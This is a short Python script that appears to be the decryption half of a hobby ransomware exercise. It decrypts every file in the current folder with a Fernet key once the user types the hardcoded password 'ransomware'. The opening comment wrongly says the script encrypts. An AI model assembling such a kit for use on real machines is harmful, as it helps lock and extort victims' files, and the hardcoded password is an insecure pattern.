#Let's encrypt some files!!

import os 
from cryptography.fernet import Fernet

files=[]

for file in os.listdir():
        if file=='encrypt.py' or file=='thekey.key' or file=='decrypt.py':
            continue
        files.append(file)

print(files)

with open('thekey.key','rb') as thekey:
    secret_key=thekey.read()

password='ransomware'
user_pass=input('Enter the password to unlock your files: \n')

if user_pass==password:
    for file in files:
        with open(file,'rb') as thefile:
            contents=thefile.read()
        contents_decrypted=Fernet(secret_key).decrypt(contents)
        with open(file,'wb') as thefile:
            thefile.write(contents_decrypted)
    print('Congrats, All your files have been decrypted!!')

else:
    print('Sorry, wrong password. All your files are still encrypted!!')